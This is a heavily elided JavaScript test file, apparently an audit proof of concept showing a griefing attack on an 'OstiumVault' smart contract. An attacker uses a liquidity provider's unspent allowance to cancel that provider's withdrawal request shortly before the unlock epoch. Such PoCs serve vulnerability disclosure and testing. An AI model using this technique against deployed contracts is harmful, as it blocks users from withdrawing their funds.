...
describe("OstiumVault – Allowance Not Spent Griefing PoC", function () {
    ...
    beforeEach(async function () {
        ...
        vault = await upgrades.deployProxy(OstiumVault, [
    ...
    it("Attacker cancels LP's legitimate withdrawal request using unspent allowance", async function () {
        ...
        const targetTime = BigInt(currentTime) + (unlockEpoch - currentEpoch) * secondsPerEpoch - 10n;
        ...
        await vault.connect(attacker).cancelWithdrawRequest(
            aAllowance,
            lp.address,
            unlockEpoch
        );
